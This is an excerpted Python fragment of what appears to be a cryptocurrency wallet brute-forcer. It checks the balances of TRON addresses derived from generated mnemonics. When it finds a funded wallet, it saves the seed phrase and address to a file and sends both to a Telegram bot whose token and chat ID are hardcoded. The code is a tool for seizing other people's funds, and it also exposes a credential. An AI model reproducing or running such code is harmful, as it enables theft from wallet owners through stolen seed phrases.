...
def send_notification(mnemonic, address):
    bot_token = '6561282405:AAGp6z2CYLw6NnrwbZ8ntIX9bm07UOXtiB4'
    chat_id = '1073690504'
    message = f"Non-zero balance found for Address: {address}, Mnemonic: {mnemonic}"
        ...
        while True:
            try:
                ...
                for tron_address in tron_addresses:
                    ...
                    balance_tasks.append((tron_address, balance_task))  # Store (address, task) pair
                    await asyncio.sleep(request_delay)  # Delay between requests

                # Process balances and save non-zero balances
                for address, task in balance_tasks:
                    balance_tron = await task
                    if balance_tron > 0:
                        print(f"Non-zero balance found! Saving mnemonic and address.")
                        save_to_file(mnemonics[tron_addresses.index(address)], address)
                        send_notification(mnemonics[tron_addresses.index(address)], address)
